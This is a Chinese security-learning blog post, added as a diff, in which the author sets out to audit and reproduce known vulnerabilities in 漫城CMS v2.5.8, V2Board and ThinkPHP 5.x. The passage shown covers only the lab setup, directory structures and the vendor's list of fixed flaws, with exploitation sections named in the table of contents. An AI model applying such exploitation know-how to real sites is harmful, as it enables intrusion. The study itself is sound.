@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞测试">
+<meta property="og:url" content="https://ttoc.fun/CMS-Test/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122144520325.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122144602259.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122212640814.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122211650800.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122165423902.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124135152005.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124135229059.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124135257569.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141049742.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141119999.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141240128.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141731975.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141845487.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141931064.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124141937935.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142002433.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142151770.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142246178.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142618960.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142629873.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124142651295.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124150939398.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124151113186.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124151205737.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126214707108.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126214959756.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221127003105524.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221127003130496.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221127141028144.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221127141800552.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126222051780.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126222725930.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126224127893.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126224210939.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126224303900.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221126224401491.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221128180130164.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221128180148359.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221128201313981.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221128201331468.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122151951892.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122152043515.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122152444788.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122153207506.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122152819257.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122154113084.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122162549084.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122165943218.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122222054711.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221122222413963.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221123201716429.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221123123229249.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124133546733.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20221124133558480.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113161644874.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113165445597.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113161201687.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113165230066.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113171237926.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113172957033.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113180827350.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20230113180921938.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009164442382.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009162634591.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009170933411.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009171248934.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009171439187.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009172603174.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009172638149.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009172953514.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009173812659.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009173923949.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009175218331.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009174731186.png">
+<meta property="og:image" content="https://ttoc.fun/CMS-Test/image-20231009175604641.png">
+<meta property="article:published_time" content="2022-11-22T05:36:05.907Z">
+<meta property="article:modified_time" content="2023-10-09T09:59:37.931Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.fun/CMS-Test/image-20221122144520325.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>漏洞测试</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li>
+          <li><a href="/archives/">文章</a></li>
+        <li><a href="/search/">搜索</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/CVE-Test/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/crypto+misc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/CMS-Test/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/CMS-Test/&text=漏洞测试"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/CMS-Test/&is_video=false&description=漏洞测试"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=漏洞测试&body=Check out this article: https://ttoc.fun/CMS-Test/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/CMS-Test/&title=漏洞测试"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/CMS-Test/&name=漏洞测试&description=&lt;p&gt;&lt;code&gt;训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/CMS-Test/&t=漏洞测试"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%AB%E5%9F%8ECMS-v2-5-8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漫城CMS v2.5.8漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAphpstudy"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建phpstudy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.1.1.</span> <span class="toc-text">管理员页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E9%A1%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">主页</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">官方文档信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">模板目录结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="toc-number">1.2.3.</span> <span class="toc-text">版本更新文档</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS%E5%B7%B2%E8%A2%AB%E6%89%BE%E5%88%B0%E7%9A%84%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">CMS已被找到的公开漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">批量代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%85%E5%80%BC%E6%9C%88%E7%A5%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.充值月票逻辑缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">代码分析+漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%90%8E%E5%8F%B0%E4%B8%80%E5%A4%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.</span> <span class="toc-text">3.后台一处安全漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%9C%E5%AE%B6%E5%8F%91%E5%B8%83%E6%BC%AB%E7%94%BB%E5%B0%8F%E8%AF%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.作家发布漫画小说命令执行漏洞(复现失败)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">代码分析+漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%AB%E7%94%BB"><span class="toc-number">1.5.4.1.1.</span> <span class="toc-text">漫画</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E8%AF%B4"><span class="toc-number">1.5.4.1.2.</span> <span class="toc-text">小说</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E6%B5%8B"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">猜测</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V2Board-v1-6-1-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">V2Board  v1.6.1 越权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP 5.x 远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%9E%84%E9%80%A0payload%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞构造payload以及复现</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        漏洞测试
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ttoc</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-22T05:36:05.907Z" class="dt-published" itemprop="datePublished">2022-11-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络安全学习</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><code>训练一下自己的代码审计能力，了解一些开源框架的漏洞形成原因，并自己尝试复现</code></p>
+<span id="more"></span>
+
+<h1 id="漫城CMS-v2-5-8漏洞分析"><a href="#漫城CMS-v2-5-8漏洞分析" class="headerlink" title="漫城CMS v2.5.8漏洞分析"></a>漫城CMS v2.5.8漏洞分析</h1><blockquote>
+<p>免费看漫画(</p>
+</blockquote>
+<h2 id="环境搭建phpstudy"><a href="#环境搭建phpstudy" class="headerlink" title="环境搭建phpstudy"></a>环境搭建<code>phpstudy</code></h2><blockquote>
+<p>Apache 2.4.43<br>MySQL 8.0.12<br>php 7.3.4</p>
+</blockquote>
+<h3 id="管理员页面"><a href="#管理员页面" class="headerlink" title="管理员页面"></a>管理员页面</h3><p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122144520325.png"><img src="/CMS-Test/image-20221122144520325.png" alt="image-20221122144520325"></a></p>
+<h3 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h3><p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122144602259.png"><img src="/CMS-Test/image-20221122144602259.png" alt="image-20221122144602259"></a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="官方文档信息"><a href="#官方文档信息" class="headerlink" title="官方文档信息"></a>官方文档信息</h3><p>整体目录结构</p>
+<p>如下（大致猜测漏洞出现位置）：</p>
+<blockquote>
+<p>  │─attachment &#x2F;&#x2F;附件目录<br>  │─caches  &#x2F;&#x2F;缓存目录<br>  │─packs &#x2F;&#x2F;静态文件目录<br>  │─rewrite &#x2F;&#x2F;伪静态文件目录<br>  │─sys &#x2F;&#x2F;系统核心目录<br>  │  │─apps &#x2F;&#x2F;应用目录<br>  │  │─class &#x2F;&#x2F;第三方库类目录【可能存在】<br>  │  │─errors &#x2F;&#x2F;系统错误提示目录<br>  │  │─libs &#x2F;&#x2F;系统常量配置目录<br>  │  │─system &#x2F;&#x2F;CI框架目录<br>  │─template &#x2F;&#x2F;模板目录【可能存在】<br>  │  │─admin &#x2F;&#x2F;后台模板<br>  │  │─install &#x2F;&#x2F;系统安装模板<br>  │  │─pc &#x2F;&#x2F;前台PC端模版<br>  │  │─wap &#x2F;&#x2F;前台手机模版<br>  │─admin.php &#x2F;&#x2F;后台入口文件（为了安全起见，请修改文件名）【可能存在】<br>  └─index.php &#x2F;&#x2F;入口文件【可能存在】</p>
+</blockquote>
+<h3 id="模板目录结构"><a href="#模板目录结构" class="headerlink" title="模板目录结构"></a>模板目录结构</h3><p>系统模板系统放在&#x2F;template&#x2F;目录下。在后台站点设置中，可以选择当前使用的模板</p>
+<blockquote>
+<p>│─template&#x2F;[pc&#x2F;wap]&#x2F;1&#x2F; 模板1<br>│ ├─js js文件<br>│ ├─css css文件<br>│ ├─images 图片文件<br>│ ├─html 模板文件目录（该目录名可以随意修改，注意tpl.php也有需要同时修改）<br>│ │  │─custom 自定义模板目录<br>│ │  │─author 作者中心目录<br>│ │  │  │─packs.html 样式模版<br>│ │  │  │─head.html 模板头部文件<br>│ │  │  │─bottom.html 模板底部文件<br>│ │  │  │─left.html 模板左部文件<br>│ │  │  │─right.html 模板右部文件<br>│ │  │  │─chapter.html 章节列表模版<br>│ │  │  │─chapter_add.html 新增章节模版<br>│ │  │  │─chapter_edit.html 修改章节模版<br>│ │  │  │─comic.html 漫画列表模版<br>│ │  │  │─comic_add.html 新增漫画模版<br>│ │  │  │─comic_info.html 漫画详情模版<br>│ │  │  │─comment.html 读者评论模版<br>│ │  │  │─drawing.html 提现记录模版<br>│ │  │  │─drawing_add.html 申请提现模版<br>│ │  │  │─home.html 作者主页模版<br>│ │  │  │─income.html 分成记录模版<br>│ │  │  │─index.html 作者中心主页模版<br>│ │  │  │─renzheng.html 作者认证模版<br>│ │  │─user 读者中心目录<br>│ │  │  │─packs.html 样式模版<br>│ │  │  │─head.html 模板头部文件<br>│ │  │  │─bottom.html 模板底部文件<br>│ │  │  │─left.html 模板左部文件<br>│ │  │  │─right.html 模板右部文件<br>│ │  │  │─index.html 读者中心主页模版<br>│ │  │  │─bind.html 第三方账号绑定模版<br>│ │  │  │─buy.html 消费记录模版<br>│ │  │  │─comic.html 漫画购买记录模版<br>│ │  │  │─comment.html 评论记录模版<br>│ │  │  │─fav.html 漫画收藏记录模版<br>│ │  │  │─info.html 资料修改模版<br>│ │  │  │─info_pass.html 密码修改模版<br>│ │  │  │─message.html 消息列表模版<br>│ │  │  │─order.html 充值订单记录模版<br>│ │  │  │─read.html 阅读记录模版<br>│ │  │  │─ticket.html 月票消费记录模版<br>│ │  │  │─pay.html 充值中心模版<br>│ │  │  │─pay_cion.html 虚拟币充值模版<br>│ │  │  │─pay_ticket.html 购买月票模版<br>│ │  │  │─pay_vip.html 充值VIP模版<br>│ │  │  │─reg.html 用户注册模版<br>│ │  │  │─login.html 用户登陆模版<br>│ │  │  │─pass.html 找回密码模版<br>│ │  │─packs.html 样式模版<br>│ │  │─head.html 模板头部文件<br>│ │  │─bottom.html 模板底部文件<br>│ │  │─left.html 模板左部文件<br>│ │  │─right.html 模板右部文件<br>│ │  │─category.html 漫画检索模版<br>│ │  │─chapter.html 漫画阅读模版<br>│ │  │─comic.html 漫画详情模版<br>│ │  │─comment.html 漫画评论模版<br>│ │  │─error.html 错误提示模版<br>│ │  │─index.html 主页模版<br>│ │  │─lists.html 分类页模版<br>│ │  │─search.html 漫画搜索模版<br>│ ├─pic.png 模板演示图片文件<br>│ ├─tpl.php 模板信息文件<br>│─tempalte&#x2F;[pc&#x2F;wap]&#x2F;2&#x2F; 模板2<br>│─…<br>│─template&#x2F;[pc&#x2F;wap]&#x2F;n&#x2F; 模板N</p>
+</blockquote>
+<h3 id="版本更新文档"><a href="#版本更新文档" class="headerlink" title="版本更新文档"></a>版本更新文档</h3><p>当我们在后台页面时，会弹出更新提醒，在这提醒中我们大致得到了几个已知漏洞的存在</p>
+<blockquote>
+<p>当前环境mccms v2.5.8</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122212640814.png"><img src="/CMS-Test/image-20221122212640814.png" alt="image-20221122212640814"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122211650800.png"><img src="/CMS-Test/image-20221122211650800.png" alt="image-20221122211650800"></a></p>
+<p>在官方提示更新的文档中，我们得到消息</p>
+<p>在当前<code>v2.5.8</code>版本中，存在至少4个漏洞</p>
+<blockquote>
+<p>1.修复了充值月票逻辑缺陷<br>2.修复了作家发布漫画小说命令执行漏洞<br>3.修复了SQL注入漏洞<br>4.修复了后台一处安全漏洞</p>
